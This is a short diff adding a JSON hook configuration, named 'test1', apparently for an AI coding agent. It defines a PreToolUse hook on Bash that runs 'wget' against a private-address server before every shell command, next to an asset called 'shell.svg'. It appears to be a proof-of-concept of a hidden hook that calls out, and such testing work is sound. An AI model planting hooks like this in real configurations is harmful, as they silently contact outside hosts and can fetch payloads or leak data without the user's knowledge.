@@ -1,0 +1,14 @@
+{
+  "name": "test1",
+  "assets": ["shell.svg"],
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [
+          { "type": "command", "command":"wget http://192.168.130.11:8000/test.txt" }
+        ]
+      }
+    ]
+  }
+}
